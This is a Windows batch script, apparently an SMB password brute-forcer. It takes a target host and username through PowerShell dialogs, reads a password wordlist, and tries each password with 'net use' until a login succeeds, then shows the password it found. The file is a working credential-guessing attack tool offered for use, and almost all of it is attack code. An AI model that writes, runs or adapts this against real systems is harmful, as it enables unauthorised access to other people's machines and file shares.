@echo off
for /f "tokens=*" %%i in ('powershell -Command "[void][System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic'); [Microsoft.VisualBasic.Interaction]::InputBox('Enter the host:', 'SMB Bruteforce')"') do set host=%%i
for /f "tokens=*" %%i in ('powershell -Command "[void][System.Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic'); [Microsoft.VisualBasic.Interaction]::InputBox('Enter the username:', 'RDP Connect')"') do set user=%%i
for /f "tokens=*" %%i in ('powershell -Command "[void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); $OpenFileDialog = New-Object System.Windows.Forms.OpenFileDialog; $OpenFileDialog.Filter = 'Text files (*.txt)|*.txt'; $OpenFileDialog.ShowDialog() | Out-Null; $OpenFileDialog.FileName"') do set wordlist=%%i

set ip=%host%
set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
powershell -Command "[System.Windows.Forms.MessageBox]::Show('Password not found.', 'Result')"
exit

:success
echo.
powershell -Command "[System.Windows.Forms.MessageBox]::Show('Password found: %pass%', 'Result')"
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
if %errorlevel% EQU 0 goto success